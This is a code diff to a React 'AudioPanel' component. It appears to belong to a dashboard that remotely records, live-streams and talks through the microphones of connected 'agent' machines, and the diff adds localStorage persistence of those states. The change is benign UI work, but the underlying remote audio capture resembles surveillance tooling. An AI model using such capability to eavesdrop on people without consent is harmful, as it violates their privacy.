@@ -28,17 +28,18 @@ export default function AudioPanel({ agentId, agentName }: { agentId: string; ag
   const apiBase = (import.meta as any).env?.VITE_MASTER_API_URL || (typeof window !== 'undefined' ? window.location.origin : '')
   const token = (typeof localStorage !== 'undefined' ? localStorage.getItem('master_token') : null) || ''
 
-  // --- Agent mic record toggle ---
-  const toggleRecord = async () => {
-    if (!recording) {
-      dashboardSocket.audioStart(agentId, { sample_rate: rate, channels: ch })
-      setRecording(true)
-    } else {
-      dashboardSocket.audioStop(agentId)
-      setRecording(false)
-      // Give backend time to persist and expose in history, then auto-download
-      setTimeout(() => autoDownloadLatestAudio(), 1200)
-    }
+  // --- Agent mic recording (separate start/stop) ---
+  const startRecordAgent = async () => {
+    dashboardSocket.audioStart(agentId, { sample_rate: rate, channels: ch })
+    setRecording(true)
+    try { localStorage.setItem(`mc:audioRecording:${agentId}`, '1') } catch {}
+  }
+  const stopRecordAgent = async () => {
+    dashboardSocket.audioStop(agentId)
+    setRecording(false)
+    try { localStorage.removeItem(`mc:audioRecording:${agentId}`) } catch {}
+    // Give backend time to persist and expose in history, then auto-download
+    setTimeout(() => autoDownloadLatestAudio(), 1200)
   }
 
   const autoDownloadLatestAudio = async () => {
@@ -118,6 +119,7 @@ export default function AudioPanel({ agentId, agentName }: { agentId: string; ag
       src.connect(proc)
       proc.connect(ctx.destination)
       setTalking(true)
+      try { localStorage.setItem(`mc:intercom:${agentId}`, '1') } catch {}
     } catch (e) {
       console.warn('Failed to start live talk', e)
       setTalking(false)
@@ -127,6 +129,7 @@ export default function AudioPanel({ agentId, agentName }: { agentId: string; ag
   const stopTalk = () => {
     try { dashboardSocket.intercomStop(agentId) } catch {}
     setTalking(false)
+    try { localStorage.removeItem(`mc:intercom:${agentId}`) } catch {}
     setMuted(false)
     try { if (procRef.current) procRef.current.disconnect() } catch {}
     try { if (audioCtxRef.current) audioCtxRef.current.close() } catch {}
@@ -145,6 +148,7 @@ export default function AudioPanel({ agentId, agentName }: { agentId: string; ag
 
   // --- Start/Stop Listening to agent audio ---
   const handleAudioLiveChunk = (chunk: { pcm_b64: string; rate?: number; ch?: number }) => {
+    try { localStorage.setItem(`mc:audioListening:${agentId}`, '1') } catch {}
     try {
       const ctx = listenCtxRef.current || new (window.AudioContext || (window as any).webkitAudioContext)({})
       if (!listenCtxRef.current) listenCtxRef.current = ctx
@@ -189,11 +193,13 @@ export default function AudioPanel({ agentId, agentName }: { agentId: string; ag
     dashboardSocket.onAudioLive(agentId, handleAudioLiveChunk)
     dashboardSocket.audioListenStart(agentId, { sample_rate: rate, channels: ch })
     setListening(true)
+    try { localStorage.setItem(`mc:audioListening:${agentId}`, '1') } catch {}
   }
   const stopListening = () => {
     dashboardSocket.audioListenStop(agentId)
     dashboardSocket.offAudioLive(agentId, handleAudioLiveChunk)
     setListening(false)
+    try { localStorage.removeItem(`mc:audioListening:${agentId}`) } catch {}
     try { if (listenCtxRef.current) listenCtxRef.current.close() } catch {}
     listenCtxRef.current = null
     scheduleAtRef.current = 0
@@ -226,6 +232,20 @@ export default function AudioPanel({ agentId, agentName }: { agentId: string; ag
     return () => { if (rafRef.current) cancelAnimationFrame(rafRef.current) }
   }, [])
 
+  // Attempt to restore state after refresh (best-effort; may be blocked by autoplay policies)
+  useEffect(() => {
+    try {
+      if (localStorage.getItem(`mc:audioListening:${agentId}`) === '1' && !listening) startListening()
+    } catch {}
+    try {
+      if (localStorage.getItem(`mc:audioRecording:${agentId}`) === '1') setRecording(true)
+    } catch {}
+    try {
+      if (localStorage.getItem(`mc:intercom:${agentId}`) === '1') setTalking(true)
+    } catch {}
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [agentId])
+
   return (
     <div className="card" style={{ marginTop: 10 }}>
       <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 8 }}>
@@ -238,13 +258,12 @@ export default function AudioPanel({ agentId, agentName }: { agentId: string; ag
             <option value={1}>Mono</option>
             <option value={2}>Stereo</option>
           </select>
-          <button className="btn" onClick={toggleRecord}>{recording ? 'Stop Recording' : 'Record Agent'}</button>
-          {!listening ? (
-            <button className="btn" onClick={startListening}>Start Listening</button>
-          ) : (
-            <button className="btn secondary" onClick={stopListening}>Stop Listening</button>
-          )}
-          <button className={`btn ${talking ? 'secondary' : ''}`} onClick={toggleTalk}>{talking ? 'Stop Live Talk' : 'Start Live Talk'}</button>
+          <button className="btn" onClick={startRecordAgent}>Start Recording</button>
+          <button className="btn secondary" onClick={stopRecordAgent}>Stop Recording</button>
+          <button className="btn" onClick={startListening}>Start Listening</button>
+          <button className="btn secondary" onClick={stopListening}>Stop Listening</button>
+          <button className="btn" onClick={startTalk}>Start Live Talk</button>
+          <button className="btn secondary" onClick={stopTalk}>Stop Live Talk</button>
           <label style={{ display: 'inline-flex', alignItems: 'center', gap: 6, color: '#ddd' }}>
             <input type="checkbox" checked={muted} onChange={(e)=>toggleMute(e.target.checked)} disabled={!talking} /> Mute mic
           </label>
